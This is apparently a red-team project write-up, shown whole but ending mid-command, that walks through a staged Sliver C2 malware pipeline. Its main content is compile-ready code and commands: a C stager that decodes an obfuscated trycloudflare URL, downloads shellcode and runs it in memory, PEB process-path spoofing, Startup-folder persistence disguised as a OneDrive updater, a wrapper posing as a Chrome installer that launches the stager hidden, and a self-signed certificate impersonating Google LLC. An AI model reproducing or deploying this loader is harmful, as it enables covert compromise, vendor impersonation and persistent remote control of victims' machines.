---
title: "Sliver C2 Stager — Staged Payload Delivery with AV/EDR Evasion"
description: "A complete staged payload pipeline: Sliver mTLS beacon, XOR-obfuscated URL in a custom C stager, PEB process path spoofing, Startup-folder persistence, and delivery wrapped inside a fake Chrome installer with a spoofed Authenticode signature."
date: 2026-07-12
status: "research"
category: "Red Team"
stack: [C, Sliver, MinGW, Cloudflared, OpenSSL, Windows Internals, Sysmon, Wazuh]
video: "https://youtu.be/3qo1Yd_M6kE"
tags: [sliver, c2, stager, peb-spoofing, evasion, persistence, code-signing, red-team]
---

## The premise

Sliver is the open-source C2 framework that has replaced Cobalt Strike as the default choice for many red teams. It is free, cross-platform, actively maintained, and produces payloads that work on Windows, Linux, macOS, and BSD. For operators who have moved away from commercial tooling — either because of cost, availability, or the detection surface that Cobalt Strike has accumulated over a decade — Sliver is the natural migration path.

But Sliver's default payloads are not subtle. The `generate` command produces a binary that connects to the configured listener, and the connection is reasonably detectable by a modern EDR. The framework provides the C2 infrastructure; the evasion layer is the operator's responsibility. This project is that layer.

The design is a **staged payload**. The initial binary is a small stager that downloads a larger beacon from a remote server and executes it in memory. The stager is simple, cheap to produce, and easy to modify. The beacon is the full Sliver implant, generated separately and stored on infrastructure that can be changed without recompiling the stager.

The complete pipeline has five components:

1. **The Sliver beacon** — generated with `--evasion` enabled, delivered as shellcode.
2. **The C stager** — downloads the beacon over HTTPS, XOR-obfuscates the URL, executes the beacon in memory.
3. **PEB process path spoofing** — modifies the process environment block so that Task Manager shows a legitimate path.
4. **Startup folder persistence** — copies itself to `%APPDATA%\Microsoft\OneDrive\OneDriveUpdate.exe` and creates a shortcut in the Startup folder.
5. **Wrapper delivery** — bundles a legitimate Chrome installer with the stager inside a single executable, with a spoofed Authenticode signature.

Each component addresses a specific detection surface. The stager addresses the static signature and the C2 address. The PEB spoofing addresses the process-path inspection. The persistence addresses the need to survive reboots. The wrapper addresses the initial delivery.

The result is a pipeline that scores 7.8/10 against a basic Wazuh deployment without Sysmon, 7.0/10 against Wazuh with Sysmon and an analyst, and 5.5-6.0/10 against a real EDR with behavioral monitoring. The scoring reflects the reality that the strongest defenses — application allowlisting, memory scanning, ETW-Ti — are the ones that require more than the attacker is willing to invest.

## Part one — the full pipeline

Before the code, the architecture. Understanding the flow is necessary because each step depends on the previous one.

```
     OPERATOR (Kali Linux)
     ────────────────────────────────────────────────
       Sliver Server        :443 mTLS
       Python HTTP Server   :8000
       Cloudflare Tunnel    free tier
       Produces → beacon.bin (raw shellcode)

                        │
                        │ HTTPS via Cloudflare edge
                        ▼

     TARGET (Windows)
     ────────────────────────────────────────────────
       1. wrapper.exe — fake Chrome installer
          Extracts ChromeSetup.exe + Installer.exe
          to %TEMP%, runs Chrome visible,
          stager hidden

                        │
                        ▼

       2. Installer.exe — the stager
          Decodes URL (XOR 0x5A)
          Downloads beacon.bin over HTTPS
          VirtualAlloc (RW) → memcpy → Protect (RX)
          Calls beacon shellcode as function pointer

                        │
                        ▼

       3. beacon.bin — Sliver implant
          Connects to Cloudflare mTLS listener
          Receives operator commands

       Persistence (parallel with beacon execution):
          Self-copy → %APPDATA%\Microsoft\OneDrive\
          Shortcut  → Startup folder
```

The flow is linear from the operator's perspective: generate the beacon, serve it, deliver the wrapper, get a session. On the target side, the flow is more complex because three binaries execute in sequence (wrapper, Chrome, stager) and the persistence mechanism runs in parallel with the C2 session establishment.

## Part two — Sliver and Cloudflare Tunnel

The Sliver server runs on a Kali Linux machine. The first step is starting the server:

```bash
sliver-server
```

Inside the Sliver console, the operator creates a listener. Sliver supports several protocols — mTLS, HTTP, HTTPS, DNS, WireGuard, and TCP. The choice of protocol determines the network footprint and the detection surface.

### Lab configuration (direct mTLS)

For a lab environment where the target and the C2 are on the same network, the mTLS listener is the simplest:

```bash
sliver > mtls --lhost 0.0.0.0 --lport 443
```

The `--lhost 0.0.0.0` binds the listener to all interfaces. The `--lport 443` uses the HTTPS port, which means the traffic blends with normal web traffic on the wire.

The profile is created with the private IP of the Sliver server:

```bash
sliver > profiles new --mtls 192.168.178.128:443 --arch amd64 --os windows --format shellcode --evasion win64
```

The `--evasion win64` flag enables Sliver's built-in evasion features: AMSI bypass, ETW patching, and stack spoofing. These are not comprehensive — they raise the bar, they do not eliminate detection — but they are the baseline that any Sliver payload should have.

The `--format shellcode` flag produces raw shellcode rather than a PE executable. Shellcode is easier to embed in a stager and execute in memory, because it does not require parsing a PE header or resolving imports — the beacon's own loader handles that.

### Production configuration (Cloudflare Tunnel)

The private IP `192.168.178.128:443` is fine for a lab, but it is a liability in a real engagement. Any analyst who inspects the network connections of the stager sees a connection to a private IP, which is anomalous for a binary that claims to be a Microsoft OneDrive update.

The fix is Cloudflare Tunnel. A free Cloudflare Tunnel provides a public `*.trycloudflare.com` domain that forwards to the local listener:

```bash
cloudflared tunnel --url http://127.0.0.1:443
```

The output includes a URL like `https://holding-mark-provided-carb.trycloudflare.com`. This URL is used in the profile:

```bash
sliver > http --lhost 0.0.0.0 --lport 443
sliver > profiles new --http https://holding-mark-provided-carb.trycloudflare.com:443 --arch amd64 --os windows --format shellcode --evasion win64
sliver > profiles generate win64 --save ~/sliver/Indetectable-deepseek/server/beacon.bin
```

The beacon connects to the Cloudflare domain, Cloudflare forwards the traffic to the Sliver listener, and the operator gets a session. From the target's perspective, the connection is to a Cloudflare-hosted domain — plausible traffic that blends with normal web activity.

**The critical operational limitation:** the free tier of Cloudflare Tunnel generates a **new URL every time the tunnel restarts**. This means that if the tunnel goes down (network issue, Cloudflare maintenance, operator reboot), the URL changes, and the stager's hardcoded URL no longer works. The stager must be recompiled with the new URL, and any already-deployed stagers become unusable.

This is why the production setup uses two tunnels: one for the beacon download (Python HTTP server) and one for the C2 (Sliver listener). They can be restarted independently, and the beacon URL is less likely to change during an active engagement. Even so, a long engagement requires either a paid Cloudflare plan (which allows persistent named tunnels) or a different infrastructure entirely (a VPS with a stable domain).

The trade-off between Cloudflare and a direct VPS is latency vs. opsec. Cloudflare adds a round trip through their edge, which increases the beacon interval's effective latency. For interactive sessions, the difference is noticeable. For long-haul persistence with a long beacon interval, it is irrelevant. A VPS with a stable IP and a legitimate-looking domain is faster but requires the operator to register a domain and pay for the VPS — which is a link back to the operator if the payment method is not anonymous.

## Part three — URL obfuscation with crypt_url.py

The URL of the beacon is XOR-encrypted with the key `0x5A` and stored as a byte array in the stager. This is not cryptography in any meaningful sense — the key is in the binary, and any analyst who finds the array can decode it with a single XOR operation. It is obfuscation against static string scanning: a YARA rule that looks for `trycloudflare.com` in the binary does not match, because the string is never stored in plaintext.

The encryption script:

```python
# crypt_url.py
import sys

key = 0x5A

# URLs (ajústalas a tu entorno)
beacon_url = "https://marshall-buffalo-persistent-biz.trycloudflare.com/beacon.bin"

def generate(url):
    enc = [ord(c) ^ key for c in url]
    print("unsigned char enc_url[] = {")
    for i in range(0, len(enc), 12):
        line = ", ".join(f"0x{b:02X}" for b in enc[i:i+12])
        print(f"    {line},")
    print("};")
    print(f"#define URL_LEN {len(url)}")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "beacon":
        generate(beacon_url)
```

The script is invoked with the `beacon` argument to generate the encoded array for the beacon URL:

```bash
python3 crypt_url.py beacon
```

The output is a C array of hex bytes, ready to paste into the stager source. The same script can be extended to encode multiple URLs (e.g., a separate loader URL) by adding more branches to the argument handling.

At runtime, the stager decodes the array with the same key:

```c
char url[URL_LEN + 1];
for (int i = 0; i < URL_LEN; i++) url[i] = enc_url[i] ^ 0x5A;
url[URL_LEN] = 0;
```

The decoded URL is stored in a stack buffer, used once, and overwritten when the function returns. There is no persistent plaintext copy.

## Part four — the stager

The stager is a Windows executable written in C, cross-compiled with MinGW-w64. It is the binary that the target actually executes — the one that arrives inside the wrapper. Its job is to download the beacon and execute it in memory.

The full source:

```c
/*
 * stager.c – Se copia a %APPDATA%\Microsoft\OneDrive\OneDriveUpdate.exe,
 *            crea un acceso directo en Startup y ejecuta el beacon.
 * Compilar:
 *   x86_64-w64-mingw32-windres version.rc -O coff -o version.res
 *   x86_64-w64-mingw32-gcc -O2 -s -mwindows -o stager.exe stager.c version.res -luser32 -lwininet -lshlwapi -lole32 -luuid -lshell32
 */
#include <windows.h>
#include <wininet.h>
#include <stdlib.h>
#include <stdio.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <objbase.h>
#include <shobjidl.h>

// ========== URL del beacon cifrada ==========
unsigned char enc_url[] = {
    0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3B, 0x38, 0x29, 0x35,
    0x28, 0x2A, 0x2E, 0x33, 0x35, 0x34, 0x77, 0x33, 0x3E, 0x3F, 0x3B, 0x36,
    0x77, 0x32, 0x3F, 0x3B, 0x2E, 0x32, 0x3F, 0x28, 0x77, 0x3B, 0x3D, 0x28,
    0x3F, 0x3F, 0x29, 0x74, 0x2E, 0x28, 0x23, 0x39, 0x36, 0x35, 0x2F, 0x3E,
    0x3C, 0x36, 0x3B, 0x28, 0x3F, 0x74, 0x39, 0x35, 0x37, 0x75, 0x38, 0x3F,
    0x3B, 0x39, 0x35, 0x34, 0x74, 0x38, 0x33, 0x34,
};
#define URL_LEN 68

// ========== Estructuras PEB ==========
typedef struct _MY_UNICODE_STRING {
    USHORT Length; USHORT MaximumLength; PWSTR Buffer;
} MY_UNICODE_STRING, *PMY_UNICODE_STRING;

typedef struct _MY_PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN BitField;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PVOID Ldr;
    PVOID ProcessParameters;
} MY_PEB, *PMY_PEB;

// ========== Prototipos WinINet ==========
typedef HINTERNET (WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL     (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL     (WINAPI *pInternetCloseHandle)(HINTERNET);

// ========== Variables globales para el spoofing ==========
WCHAR fakePath[] = L"C:\\Program Files\\Microsoft OneDrive\\OneDriveUpdate.exe";
WCHAR fakeCmd[]  = L"\"C:\\Program Files\\Microsoft OneDrive\\OneDriveUpdate.exe\"";

// ========== PEB spoofing local ==========
void SpoofProcessPath() {
    PMY_PEB peb;
    __asm__("movq %%gs:0x60, %0" : "=r"(peb));
    if (!peb) return;
    PVOID* paramsPtr = (PVOID*)((BYTE*)peb + 0x20);
    if (!*paramsPtr) return;
    MY_UNICODE_STRING* imagePath = (MY_UNICODE_STRING*)((BYTE*)*paramsPtr + 0x38);
    MY_UNICODE_STRING* cmdLine   = (MY_UNICODE_STRING*)((BYTE*)*paramsPtr + 0x48);
    imagePath->Buffer = fakePath;
    imagePath->Length = lstrlenW(fakePath) * sizeof(WCHAR);
    imagePath->MaximumLength = sizeof(fakePath);
    cmdLine->Buffer = fakeCmd;
    cmdLine->Length = lstrlenW(fakeCmd) * sizeof(WCHAR);
    cmdLine->MaximumLength = sizeof(fakeCmd);
}

// ========== Crear acceso directo en Startup ==========
BOOL CreateShortcutInStartup(LPCSTR targetPath) {
    CHAR startupPath[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) return FALSE;
    CHAR shortcutPath[MAX_PATH];
    wsprintfA(shortcutPath, "%s\\OneDriveUpdate.lnk", startupPath);

    CoInitialize(NULL);
    IShellLinkA* pShellLink = NULL;
    IPersistFile* pPersistFile = NULL;
    BOOL result = FALSE;

    if (SUCCEEDED(CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
                                   &IID_IShellLinkA, (void**)&pShellLink))) {
        pShellLink->lpVtbl->SetPath(pShellLink, targetPath);
        pShellLink->lpVtbl->SetDescription(pShellLink, "Microsoft OneDrive Updater");
        if (SUCCEEDED(pShellLink->lpVtbl->QueryInterface(pShellLink, &IID_IPersistFile,
                                                         (void**)&pPersistFile))) {
            WCHAR widePath[MAX_PATH];
            MultiByteToWideChar(CP_ACP, 0, shortcutPath, -1, widePath, MAX_PATH);
            if (SUCCEEDED(pPersistFile->lpVtbl->Save(pPersistFile, widePath, TRUE)))
                result = TRUE;
            pPersistFile->lpVtbl->Release(pPersistFile);
        }
        pShellLink->lpVtbl->Release(pShellLink);
    }
    CoUninitialize();
    return result;
}

// ========== Copiarse a %APPDATA%\Microsoft\OneDrive\ ==========
BOOL CopyToAppData() {
    CHAR selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    CHAR appData[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData))) return FALSE;
    CHAR destDir[MAX_PATH];
    wsprintfA(destDir, "%s\\Microsoft\\OneDrive", appData);
    CreateDirectoryA(destDir, NULL);
    CHAR destPath[MAX_PATH];
    wsprintfA(destPath, "%s\\OneDriveUpdate.exe", destDir);
    return CopyFileA(selfPath, destPath, FALSE);
}

// ========== Punto de entrada ==========
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    CHAR selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);

    // Si no estamos en la ruta persistente, copiarnos, crear acceso directo y ejecutar la copia
    if (!StrStrIA(selfPath, "\\AppData\\Roaming\\Microsoft\\OneDrive\\OneDriveUpdate.exe") &&
        !StrStrIA(selfPath, "\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveUpdate.exe")) {
        if (!CopyToAppData()) return 1;
        CHAR appData[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
        CHAR destPath[MAX_PATH];
        wsprintfA(destPath, "%s\\Microsoft\\OneDrive\\OneDriveUpdate.exe", appData);
        CreateShortcutInStartup(destPath);
        ShellExecuteA(NULL, "open", destPath, NULL, NULL, SW_HIDE);
        ExitProcess(0);
    }

    // ======== SOMOS LA COPIA PERSISTENTE ========
    SpoofProcessPath();

    char url[URL_LEN + 1];
    for (int i = 0; i < URL_LEN; i++) url[i] = enc_url[i] ^ 0x5A;
    url[URL_LEN] = 0;

    HMODULE hWinInet = LoadLibraryA("wininet.dll");
    if (!hWinInet) return 1;

    pInternetOpenA       fnOpen   = (pInternetOpenA)GetProcAddress(hWinInet, "InternetOpenA");
    pInternetOpenUrlA    fnOpenUrl = (pInternetOpenUrlA)GetProcAddress(hWinInet, "InternetOpenUrlA");
    pInternetReadFile    fnRead   = (pInternetReadFile)GetProcAddress(hWinInet, "InternetReadFile");
    pInternetCloseHandle fnClose  = (pInternetCloseHandle)GetProcAddress(hWinInet, "InternetCloseHandle");
    if (!fnOpen || !fnOpenUrl || !fnRead || !fnClose) { FreeLibrary(hWinInet); return 1; }

    HINTERNET hInternet = fnOpen("Loader", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) { FreeLibrary(hWinInet); return 1; }

    DWORD flags = INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE;
    HINTERNET hUrl = fnOpenUrl(hInternet, url, NULL, 0, flags, 0);
    if (!hUrl) { fnClose(hInternet); FreeLibrary(hWinInet); return 1; }

    BYTE buf[4096];
    DWORD bytesRead, total = 0;
    BYTE* beacon = NULL;
    while (fnRead(hUrl, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
        BYTE* newBeacon = VirtualAlloc(NULL, total + bytesRead, MEM_COMMIT, PAGE_READWRITE);
        if (!newBeacon) break;
        if (beacon) { memcpy(newBeacon, beacon, total); VirtualFree(beacon, 0, MEM_RELEASE); }
        memcpy(newBeacon + total, buf, bytesRead);
        beacon = newBeacon;
        total += bytesRead;
    }
    fnClose(hUrl);
    fnClose(hInternet);
    FreeLibrary(hWinInet);

    if (!beacon || total == 0) return 1;

    DWORD old;
    VirtualProtect(beacon, total, PAGE_EXECUTE_READ, &old);

    void (*entry)() = (void(*)())beacon;
    entry();
    return 0;
}
```

The `version.rc` file provides the file metadata. This is what appears in the "Details" tab of the file properties, and it is what a curious user sees when they right-click the binary:

```c
#include <windows.h>

1 VERSIONINFO
FILEVERSION 1,0,0,0
PRODUCTVERSION 1,0,0,0
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904B0"
        BEGIN
            VALUE "CompanyName",      "Microsoft Corporation"
            VALUE "FileDescription",  "Microsoft OneDrive Updater"
            VALUE "FileVersion",      "1.0.0.0"
            VALUE "ProductName",      "Microsoft OneDrive"
            VALUE "ProductVersion",   "1.0.0.0"
            VALUE "LegalCopyright",   "\251 Microsoft Corporation. All rights reserved."
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 1200
    END
END
```

The compilation with MinGW-w64:

```bash
x86_64-w64-mingw32-windres version.rc -O coff -o version.res
x86_64-w64-mingw32-gcc -O2 -s -mwindows -o stager.exe stager.c version.res -luser32 -lwininet -lshlwapi -lole32 -luuid -lshell32
```

The `-O2` flag enables optimization, `-s` strips the symbol table (reduces size and removes function names), and `-mwindows` makes the binary a GUI subsystem application — no console window appears when it runs. The libraries are the ones the stager uses: `user32` for window operations, `wininet` for the download, `shlwapi` for the string helpers, `ole32` and `uuid` for the COM interface used in the shortcut creation, and `shell32` for `ShellExecuteA`.

## Part five — PEB process path spoofing

The process environment block is a user-mode data structure that Windows maintains for every process. It contains the loaded modules, the environment variables, the heap pointers, and — relevant here — the **process parameters**, which include the image path and command line.

The image path in the PEB is what Task Manager, Process Explorer, and most user-facing tools display as the "process path". The image path in the kernel's `EPROCESS` structure is different — it is set when the process is created and cannot be modified from user mode. The mismatch between the two is what a forensic analyst looks for.

The stager modifies the PEB fields to point to a legitimate path:

```c
WCHAR fakePath[] = L"C:\\Program Files\\Microsoft OneDrive\\OneDriveUpdate.exe";

void SpoofProcessPath() {
    PMY_PEB peb;
    __asm__("movq %%gs:0x60, %0" : "=r"(peb));
    if (!peb) return;
    PVOID* paramsPtr = (PVOID*)((BYTE*)peb + 0x20);
    if (!*paramsPtr) return;
    MY_UNICODE_STRING* imagePath = (MY_UNICODE_STRING*)((BYTE*)*paramsPtr + 0x38);
    MY_UNICODE_STRING* cmdLine   = (MY_UNICODE_STRING*)((BYTE*)*paramsPtr + 0x48);
    imagePath->Buffer = fakePath;
    imagePath->Length = lstrlenW(fakePath) * sizeof(WCHAR);
    imagePath->MaximumLength = sizeof(fakePath);
    cmdLine->Buffer = fakeCmd;
    cmdLine->Length = lstrlenW(fakeCmd) * sizeof(WCHAR);
    cmdLine->MaximumLength = sizeof(fakeCmd);
}
```

The offsets used:
- `gs:0x60` — the PEB pointer for the current thread (x64)
- `PEB + 0x20` — the `ProcessParameters` pointer
- `RTL_USER_PROCESS_PARAMETERS + 0x38` — the `ImagePathName` `UNICODE_STRING`
- `RTL_USER_PROCESS_PARAMETERS + 0x48` — the `CommandLine` `UNICODE_STRING`

These offsets are specific to the x64 `RTL_USER_PROCESS_PARAMETERS` structure. They are stable across modern Windows versions but are not guaranteed — a Windows update could change the layout, and the stager would crash or behave unpredictably. Production stagers should either read the offsets dynamically (via `NtQueryInformationProcess` or by parsing the PEB's linked lists) or verify the layout at startup.

The effect is that Task Manager shows `C:\Program Files\Microsoft OneDrive\OneDriveUpdate.exe` as the process path, not the actual path of the stager. An analyst who checks the running processes sees a plausible path for a Microsoft binary. The anomaly is only visible with a tool that compares the PEB against the `EPROCESS` structure — Volatility3's `pebmasquerade` plugin, or a Sysmon configuration that captures both.

**What PEB spoofing does not do:** it does not change the kernel's view. The `EPROCESS` structure, which the kernel uses for scheduling, memory management, and access control, retains the original image path. A kernel-mode EDR that reads from the kernel's structures (which is all of them, by definition) sees the truth. The PEB spoof is a userland illusion — effective against tools that read from userland, useless against tools that read from the kernel.

## Part six — persistence via the Startup folder

The stager copies itself to `%APPDATA%\Microsoft\OneDrive\OneDriveUpdate.exe` and creates a shortcut in the user's Startup folder.

The copy step:

```c
BOOL CopyToAppData() {
    CHAR selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    CHAR appData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
    CHAR destDir[MAX_PATH];
    wsprintfA(destDir, "%s\\Microsoft\\OneDrive", appData);
    CreateDirectoryA(destDir, NULL);
    CHAR destPath[MAX_PATH];
    wsprintfA(destPath, "%s\\OneDriveUpdate.exe", destDir);
    return CopyFileA(selfPath, destPath, FALSE);
}
```

The target directory — `%APPDATA%\Microsoft\OneDrive\` — already exists on most Windows systems with OneDrive installed, and on systems without it, the `CreateDirectoryA` call creates it. The filename `OneDriveUpdate.exe` blends with the legitimate OneDrive binary names (`OneDrive.exe`, `OneDriveSetup.exe`, `FileCoAuth.exe`).

The shortcut step:

```c
BOOL CreateShortcutInStartup(LPCSTR targetPath) {
    CHAR startupPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
    CHAR shortcutPath[MAX_PATH];
    wsprintfA(shortcutPath, "%s\\OneDriveUpdate.lnk", startupPath);

    CoInitialize(NULL);
    IShellLinkA* pShellLink = NULL;
    IPersistFile* pPersistFile = NULL;
    CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLinkA, (void**)&pShellLink);
    pShellLink->lpVtbl->SetPath(pShellLink, targetPath);
    pShellLink->lpVtbl->SetDescription(pShellLink, "Microsoft OneDrive Updater");
    pShellLink->lpVtbl->QueryInterface(pShellLink, &IID_IPersistFile, (void**)&pPersistFile);
    WCHAR widePath[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, shortcutPath, -1, widePath, MAX_PATH);
    pPersistFile->lpVtbl->Save(pPersistFile, widePath, TRUE);
    // ... (release interfaces)
}
```

The shortcut is created via the `IShellLink` COM interface, which is the same mechanism that the Windows shell uses when a user creates a shortcut manually. The `.lnk` file is written to the Startup folder, which causes the target binary to execute on every user logon.

The choice of Startup folder over the registry `Run` key is deliberate. Sysmon and most EDRs flag registry `Run` key modifications with high severity — the key is one of the oldest and most reliable persistence indicators. The Startup folder is also monitored, but the rules that fire are typically lower severity, and the folder is populated with legitimate shortcuts on many systems. The detection is not absent — it is quieter.

**The migration check.** The stager's entry point checks whether it is running from the persistent path. If it is not, it performs the copy and creates the shortcut, then launches the copy and exits. This means the stager only performs the persistence steps once — on the initial execution from the wrapper. Subsequent executions (from the Startup folder) skip the persistence and go straight to the beacon download and execution.

```c
if (!StrStrIA(selfPath, "\\AppData\\Roaming\\Microsoft\\OneDrive\\OneDriveUpdate.exe") &&
    !StrStrIA(selfPath, "\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveUpdate.exe")) {
    // Perform persistence
    CopyToAppData();
    CreateShortcutInStartup(destPath);
    ShellExecuteA(NULL, "open", destPath, NULL, NULL, SW_HIDE);
    ExitProcess(0);
}
// Otherwise: continue to beacon download
```

## Part seven — the wrapper

The stager is the payload, but it is not what the user sees. The user sees a Chrome installer. The wrapper is a single executable that contains both a legitimate Chrome installer and the stager, extracts both to temporary files, runs the Chrome installer visibly (so the user sees the expected behavior), and runs the stager hidden.

The full source:

```c
#include <Windows.h>
#include <strsafe.h>

#define IDR_INSTALLER 101
#define IDR_PAYLOAD   102

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")

BOOL ExtractResourceToFile(int resId, LPWSTR outPath, DWORD pathSize) {
    HRSRC hRes = FindResourceW(NULL, MAKEINTRESOURCEW(resId), RT_RCDATA);
    if (!hRes) return FALSE;
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return FALSE;
    DWORD size = SizeofResource(NULL, hRes);
    LPVOID pData = LockResource(hData);
    if (!pData || size == 0) return FALSE;

    if (GetTempPathW(pathSize, outPath) == 0) return FALSE;
    WCHAR fname[64];
    StringCchPrintfW(fname, 64, L"res_%d_%X.tmp", resId, GetTickCount());
    StringCchCatW(outPath, pathSize, fname);

    HANDLE hFile = CreateFileW(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    DWORD written = 0;
    BOOL ok = WriteFile(hFile, pData, size, &written, NULL);
    CloseHandle(hFile);
    return (ok && written == size);
}

BOOL RunProcess(LPCWSTR exePath, BOOL showWindow) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = showWindow ? SW_SHOWNORMAL : SW_HIDE;

    WCHAR cmdLine[MAX_PATH + 50];
    StringCchPrintfW(cmdLine, MAX_PATH + 50, L"\"%ls\"", exePath);

    BOOL ret = CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE,
                              showWindow ? 0 : CREATE_NO_WINDOW,
                              NULL, NULL, &si, &pi);
    if (ret) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    return ret;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    WCHAR installerPath[MAX_PATH] = {0};
    WCHAR payloadPath[MAX_PATH]   = {0};

    if (!ExtractResourceToFile(IDR_INSTALLER, installerPath, MAX_PATH))
        return 1;
    if (!ExtractResourceToFile(IDR_PAYLOAD, payloadPath, MAX_PATH)) {
        DeleteFileW(installerPath);
        return 2;
    }

    RunProcess(installerPath, TRUE);   // Chrome visible
    RunProcess(payloadPath, FALSE);    // stager oculto

    Sleep(5000);
    DeleteFileW(installerPath);
    DeleteFileW(payloadPath);
    return 0;
}
```

The `.rc` file declares the resources. There are two versions — the minimal one and the one with icon and version metadata:

**Minimal version:**

```
101 RCDATA "ChromeSetup.exe"
102 RCDATA "Installer.exe"
```

**Full version with icon and version metadata:**

```c
#include <windows.h>

// Icono principal (ID 100)
100 ICON "chrome.ico"

// Recursos binarios (instalador y stager)
101 RCDATA "ChromeSetup.exe"
102 RCDATA "Installer.exe"

// Información de versión (metadatos del ejecutable)
1 VERSIONINFO
FILEVERSION     1,0,0,0
PRODUCTVERSION  1,0,0,0
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904B0"
        BEGIN
            VALUE "CompanyName",      "Google LLC"
            VALUE "FileDescription",  "Google Chrome Installer"
            VALUE "FileVersion",      "1.0.0.0"
            VALUE "ProductName",      "Google Chrome"
            VALUE "ProductVersion",   "1.0.0.0"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 1200
    END
END
```

The `ChromeSetup.exe` is the legitimate installer, downloaded from Google. The `Installer.exe` is the stager. The `chrome.ico` is the Chrome icon, extracted from the legitimate installer. All three are embedded as raw binary resources in the wrapper.

**The manifest** is what makes the wrapper request administrator privileges. This is a critical design decision: if the wrapper does not request elevation, it runs with the user's normal token, and the stager — which needs to write to `%APPDATA%` and `%APPDATA%\Microsoft\OneDrive` — may fail on some configurations. If the wrapper requests elevation, a UAC prompt appears when the user launches it, and the wrapper runs with administrator privileges. The UAC prompt is a detection opportunity, but it is also what a legitimate Chrome installer would do on some systems, so the prompt is not necessarily suspicious.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
```

**Compilation with MSVC (Windows):**

```cmd
rc wrapper.rc
cl /O2 /MT /DUNICODE /D_UNICODE /DNDEBUG /Tc wrapper.c /link wrapper.res user32.lib /SUBSYSTEM:WINDOWS /OUT:wrapper.exe
mt -manifest wrapper.exe.manifest -outputresource:wrapper.exe;1
```

The `rc` command compiles the resource file. The `cl` command compiles the C source with optimizations, statically links the C runtime (`/MT`), defines the Unicode macros, and links against `user32.lib`. The `mt` command embeds the manifest into the executable at resource ID 1 — the standard location for application manifests.

**Compilation with MinGW-w64 (Linux):**

```bash
windres wrapper.rc -O coff -o wrapper.res
gcc -O2 -mwindows -o wrapper.exe wrapper.c wrapper.res -luser32 -lcomdlg32
```

The `windres` command compiles the resource file to COFF format, which is what MinGW-w64 uses. The `gcc` command compiles with the same flags as the stager, plus `-lcomdlg32` for the common dialog functions.

## Part eight — code signing

The wrapper is signed with a self-signed certificate that claims to be from Google LLC. This is not a valid Authenticode signature in the sense that it would pass strict validation — the certificate is not chained to a trusted root, and SmartScreen would flag it on a system with default settings. But it changes the display properties of the binary: the "Digital Signatures" tab in the file properties shows a signature, and casual inspection suggests the binary is signed.

The certificate is generated with OpenSSL:

```bash
openssl req -x509 -newkey rsa:2048 -keyout google_key.pem -out google_cert.pem -days 365 -nodes \
  -subj "/C=US/ST=California/L=Mountain View/O=Google LLC/OU=Chrome/CN=Google LLC"
```

The `-subj` flag sets the certificate subject. The values are chosen to match the values that a real Google certificate would have: the country (US), the state (California), the locality (Mountain View — Google's headquarters), the organization (Google LLC), the organizational unit (Chrome), and the common name (Google LLC). A tool that displays the certificate subject without validating it shows what looks like a legitimate Google signature.

The PKCS#12 bundle is created for the signing tool:

```bash
openssl pkcs12 -export -out google_cert.pfx -inkey google_key.pem -in google_cert.pem -passout pass:password123
```

The binary is signed with `osslsigncode`:

```bash
osslsigncode sign -pkcs12 google_cert.pfx -pass password123 -h sha256 \
